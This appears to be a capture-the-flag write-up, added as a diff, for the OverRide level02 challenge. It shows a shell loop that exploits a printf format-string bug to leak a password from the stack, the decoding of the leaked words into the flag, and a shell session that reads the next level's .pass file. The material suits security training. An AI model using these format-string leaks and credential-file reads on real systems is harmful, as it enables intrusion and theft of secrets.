@@ -1,0 +1,52 @@
+HOW TO FIND THE FLAG:
+
+By analysing the binary file and after reverse engineered it, we can see that the goal here is to enter the condition that will execute the "/bin/sh"
+
+For this we need to enter the correct password which is actually the flag in the file .pass (/home/users/level03/.pass)
+
+This value is stored in the variable after the call to 'fread'. We are going to exploit our binary by using the string format vulnerability caused by the printf function
+
+With the %p we are going to print the stack ->
+
+Let's run this shellscript -> for ((i = 0; i < 50; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
+
+We can see something that could look like our password ;
+
+22 - 0x756e505234376848 does not have access!
+23 - 0x45414a3561733951 does not have access!
+24 - 0x377a7143574e6758 does not have access!
+25 - 0x354a35686e475873 does not have access!
+26 - 0x48336750664b394d does not have access!
+
+Indeed our password is of size 40 + 1 ('\0') -> here we have 5 x 8 = 40 bytes
+
+Let's convert each value to ascii then reverse it and concanete all together
+
+
+1. 756e505234376848 -> unPR47hH -> Hh74RPnu
+2. 45414a3561733951 -> EAJ5as9Q -> Q9sa5JAE
+3. 377a7143574e6758 -> 7zqCWNgX -> XgNWCqz7
+4. 354a35686e475873 -> 5J5hnGXs -> sXGnh5J5
+5. 48336750664b394d -> H3gPfK9M -> M9KfPg3H
+
+After concatenation -> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+Let's try it
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: lol
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, lol!
+$ whoami
+level03
+$ cat /home/users/level03/.pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+Wow success !
+
+
